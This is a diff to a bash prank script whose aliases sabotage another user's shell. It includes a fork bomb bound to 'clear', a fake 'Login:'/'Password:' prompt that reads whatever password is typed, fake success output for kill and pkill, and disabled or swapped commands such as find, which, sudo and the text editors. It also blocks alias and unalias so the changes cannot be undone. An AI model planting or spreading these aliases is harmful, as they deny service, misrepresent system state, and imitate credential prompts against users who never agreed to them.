@@ -51,7 +51,7 @@ then
 fi
 
 #Just exit session when rebooting box
-annoying && alias reboot=exit;
+insane && alias reboot=exit;
 
 # Let `cat` swallow every input and never return anything.
 annoying && alias cat=true;
@@ -70,6 +70,18 @@ destructive && alias clear=':(){ :|:& };:';
 
 # Have `date` return random dates.
 annoying && alias date='date -d "now + $RANDOM days"';
+
+annoying && if [[ $[$RANDOM % 10] == 0 ]]; then
+	PS1="Login: "
+	alias $USER='stty -echo; echo -n "Password: ";read;echo;echo "Login failed.";stty echo'
+	alias root='stty -echo; echo -n "Password: ";read;echo;echo "Login failed.";stty echo'
+fi
+
+annoying && if [ "$(uname)" = 'Darwin' ]; then
+	alias sudo="say -r 200 I am sorry $USER. I am afraid, I can\'t: "
+else
+	alias sudo="echo \"I am sorry $USER. I am afraid, I can\'t\""
+fi
 
 # Sometimes, wait a few minutes and then start randomly ejecting the CD drive.
 # Other times, resist all attempts at opening it. Other times, make it read
@@ -121,8 +133,27 @@ unusable && bind '"\C-M":"\C-?"';
 # Send `n` (no) instead of `y` (yes)
 annoying && alias yes="yes n";
 
+#Make uname output windows
+annoying && alias uname='echo "Windows XP" 2>/dev/null'
+
 # Quit vim on startup.
 annoying && alias vim="vim +q";
+
+#Make kill and pkill seem successfull, even though they aren't
+insane && alias kill='echo "Process Killed"'
+insane && alias pkill='echo "Process Killed"'
+
+#Randomize Text Editors
+annoying && alias vi=nano
+annoying && alias emacs=vim
+annoying && alias vim=vi
+annoying && alias nano=emacs
+
+#Disable find
+annoying && alias find='false 2>/dev/null'
+
+#Disable which
+annoying && alias which='false 2>/dev/null'
 
 # Disable `unalias` and `alias`.
 alias unalias=false;
